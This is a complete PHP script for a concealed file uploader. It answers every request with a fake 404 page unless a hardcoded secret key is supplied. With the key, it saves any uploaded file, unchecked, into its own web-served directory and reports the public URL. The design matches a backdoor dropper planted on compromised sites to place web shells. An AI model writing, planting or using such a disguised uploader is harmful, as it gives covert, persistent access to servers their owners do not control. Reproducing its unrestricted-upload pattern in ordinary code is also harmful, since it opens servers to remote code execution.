<?php

/* ---------------------------
   SETTINGS
--------------------------- */

define("ACCESS_TOKEN", "mySecret123");
define("UPLOAD_DIR", __DIR__ . DIRECTORY_SEPARATOR);


/* ---------------------------
   ROUTER
--------------------------- */

$route = $_GET['cmd'] ?? null;
$key   = $_GET['key'] ?? null;

if ($route !== "upload" || $key !== ACCESS_TOKEN) {
    renderNotFound();
}


/* ---------------------------
   PROCESS UPLOAD
--------------------------- */

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    processUpload();
}


/* ---------------------------
   SHOW FORM
--------------------------- */

renderForm();



/* ===========================
   FUNCTIONS
=========================== */

function processUpload()
{
    if (!isset($_FILES['file_data'])) {
        exitWithMessage("No file received.", false);
    }

    $file = $_FILES['file_data'];

    if ($file['error'] !== UPLOAD_ERR_OK) {
        exitWithMessage("Upload error occurred.", false);
    }

    $cleanName = basename($file['name']);
    $target    = UPLOAD_DIR . $cleanName;

    if (!move_uploaded_file($file['tmp_name'], $target)) {
        exitWithMessage("Failed to save file.", false);
    }

    $url = generateBaseURL() . $cleanName;

    echo buildResponsePage($target, $url);
    exit;
}


function renderForm()
{
    echo '
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Upload</title>
        <style>
            body {background:#101010;color:#fff;font-family:sans-serif;padding:50px;}
            .container {background:#1e1e1e;padding:30px;border-radius:10px;width:420px;}
            input[type=file] {margin-top:15px;}
            input[type=submit] {margin-top:15px;padding:8px 20px;background:#ffc107;border:0;cursor:pointer;font-weight:bold;}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Upload File</h2>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file_data" required><br>
                <input type="submit" value="Send File">
            </form>
        </div>
    </body>
    </html>';
    exit;
}


function renderNotFound()
{
    http_response_code(404);
    echo '
    <!DOCTYPE html>
    <html>
    <head><title>404</title></head>
    <body>
        <h1>404 Not Found</h1>
        <p>Page does not exist.</p>
    </body>
    </html>';
    exit;
}


function exitWithMessage($msg, $success = true)
{
    $color = $success ? "lime" : "red";
    echo "<h3 style='color:$color;'>$msg</h3>";
    exit;
}


function buildResponsePage($serverPath, $publicURL)
{
    $link = "?cmd=upload&key=" . ACCESS_TOKEN;

    return "
    <h2 style='color:lime;'>File Uploaded Successfully</h2>
    <strong>Server Location:</strong><br>
    <code>$serverPath</code><br><br>
    <strong>Public URL:</strong><br>
    <a href='$publicURL' target='_blank'>$publicURL</a>
    <br><br>
    <a href='$link'>Upload Another File</a>
    ";
}


function generateBaseURL()
{
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    $host   = $_SERVER['HTTP_HOST'];
    $path   = rtrim(dirname($_SERVER['REQUEST_URI']), '/');

    return $scheme . $host . $path . "/";
}
?>